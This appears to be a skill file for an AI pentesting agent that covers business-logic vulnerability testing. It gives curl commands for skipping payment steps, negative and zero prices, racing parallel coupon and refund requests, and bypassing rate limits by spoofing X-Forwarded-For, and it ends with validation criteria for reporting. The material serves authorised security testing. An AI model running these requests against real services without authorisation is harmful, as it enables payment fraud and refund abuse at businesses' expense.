---
name: vuln-business-logic
description: "Business logic vulnerability testing. Tests workflow bypass, price manipulation, refund abuse, quota bypass, and state machine attacks. Triggers: 'business logic', 'workflow bypass', 'price manipulation', 'negative price', 'coupon abuse', 'refund abuse', 'step skip', 'quota bypass', 'application logic'."
---

# Business Logic Testing

Business logic security = enforcement of domain invariants under adversarial sequencing, timing, and inputs. Test state transitions, concurrency, and time boundaries simultaneously.

## Phase 1: Workflow Mapping

Capture complete request sequence for every multi-step workflow:

```bash
# Extract workflow from Caido proxy
curl -sL -X POST http://127.0.0.1:48080/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"query { requestsByOffset(limit:100, filter:{httpql:\"host.eq:<target>\"}) { edges { node { id method path query body response { statusCode length } } } count } }"}'

# Or extract from Burp project file
python3 extract_burp_requests.py --project project.burp --host <target> --out workflow.txt
```

Map state machine: identify steps, their order dependencies, and what happens if steps are skipped or reordered.

## Phase 2: State Machine Testing

Attempt skipping steps directly via API:

```bash
# Normal flow: step1 → step2 → step3 (checkout)
# Attack: skip straight to step3
curl -X POST https://<target>/api/order/confirm \
  -H "Authorization: Bearer <token>" \
  -d '{"order_id":"<id>"}' 
# Expected: 400/403 if step2 (payment) not completed
# Vulnerable: 200 OK — order confirmed without payment

# Skip email verification
curl -X POST https://<target>/api/account/verify-skip \
  -H "Authorization: Bearer <unverified_token>" \
  -d '{"action":"access_premium"}'
```

## Phase 3: Price / Amount Manipulation

```bash
# Zero price
curl -X POST https://<target>/api/cart/checkout \
  -H "Authorization: Bearer <token>" \
  -d '{"items":[{"id":"product_123","price":0,"qty":1}]}'

# Negative price (expect refund)
curl -X POST https://<target>/api/cart/checkout \
  -d '{"items":[{"id":"product_123","price":-99.99,"qty":1}]}'

# Integer overflow / large number
curl -X POST https://<target>/api/transfer \
  -d '{"amount":99999999999999}'

# Tiny amount (0.001 cent)
curl -X POST https://<target>/api/purchase \
  -d '{"amount":0.001}'

# Currency mismatch (send USD, expect EUR conversion)
curl -X POST https://<target>/api/payment \
  -d '{"amount":1,"currency":"USD"}' \
  -H "Accept-Currency: EUR"
```

## Phase 4: Race Conditions on One-Time Operations

```bash
# Parallelize coupon redemption (20 concurrent)
for i in $(seq 1 20); do
  curl -s -X POST https://<target>/api/coupon/redeem \
    -H "Authorization: Bearer <token>" \
    -d '{"code":"PROMO10"}' &
done; wait

# Parallel refunds (double-refund detection)
REFUND_PAYLOAD='{"order_id":"<order_id>"}'
for i in $(seq 1 10); do
  curl -s -X POST https://<target>/api/refund \
    -H "Authorization: Bearer <token>" \
    -d "$REFUND_PAYLOAD" &
done; wait
curl https://<target>/api/account/balance -H "Authorization: Bearer <token>"
```

## Phase 5: Quota Bypass

```bash
# Off-by-one: test at limit, at limit+1, at limit-1
for count in 4 5 6; do
  echo "=== Attempt $count ==="
  curl -X POST https://<target>/api/action \
    -H "Authorization: Bearer <token>" \
    -d "{\"count\":$count}"
done

# Session reset trick: create new session after hitting limit
TOKEN_NEW=$(curl -X POST https://<target>/api/auth/refresh \
  -d '{"refresh_token":"<token>"}' | jq -r '.token')
curl -X POST https://<target>/api/limited-action \
  -H "Authorization: Bearer $TOKEN_NEW"

# Per-IP bypass via headers
curl -X POST https://<target>/api/rate-limited \
  -H "X-Forwarded-For: 1.2.3.$(( RANDOM % 255 ))"
```

## Phase 6: Persistence Verification

```bash
# Confirm state changes are durable in authoritative source
curl https://<target>/api/account/statement -H "Authorization: Bearer <token>"
curl https://<target>/api/audit/log \
  -H "Authorization: Bearer <admin_token>" | jq '.[] | select(.user_id=="<victim_id>")'

# Check for double-entry accounting
curl https://<target>/api/transactions \
  -H "Authorization: Bearer <token>" | jq 'group_by(.reference) | .[] | select(length > 1)'
```

## High-Value Attack Surfaces

| Domain | Invariants to Test |
|--------|-------------------|
| Pricing/Cart | Price locks, quote-to-order binding, tax computation |
| Payments | Auth/capture/void sequences, idempotency key reuse |
| Subscriptions | Proration edges, trial extension, seat count races |
| Quotas | Daily/monthly limits, inventory reservation leaks |
| Referrals | Self-referral, circular chains, reward stacking |
| Loyalty Points | Double-earn, retroactive earn on cancelled orders |

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: trace specific request sequence → invariant violation → economic impact
2. **Reproducibility**: steps repeatable from clean state by another engineer
3. **Impact**: quantified business consequence (dollar amount, data exposure, service disruption)
